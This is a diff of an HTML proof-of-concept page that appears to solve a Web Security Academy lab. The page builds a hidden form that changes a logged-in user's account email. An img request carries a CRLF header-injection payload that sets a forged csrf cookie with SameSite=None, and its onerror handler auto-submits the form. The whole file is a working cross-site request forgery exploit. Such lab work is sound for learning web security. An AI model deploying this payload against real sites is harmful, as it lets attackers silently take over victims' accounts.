@@ -1,10 +1,10 @@
 <body>
-    <form action="https://0a87006403776173c26548c500f400a7.web-security-academy.net/my-account/change-email" method="POST">
+    <form action="https://0a5c00b404571cbfc5d15e3c00c200ae.web-security-academy.net/my-account/change-email" method="POST">
     <input type="hidden" name="email" value="wutang@mail.com" />
     <input type="hidden" name="csrf" value="test" />
     <input type="submit" value="Submit request" />
     </form>
 
 
-    <img src="https://0a87006403776173c26548c500f400a7.web-security-academy.net/?search=water%0d%0aSet-Cookie:%20csrfKey=test" onerror="document.forms[0].submit()">
+    <img src="https://0a5c00b404571cbfc5d15e3c00c200ae.web-security-academy.net/?search=water%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
 </body>
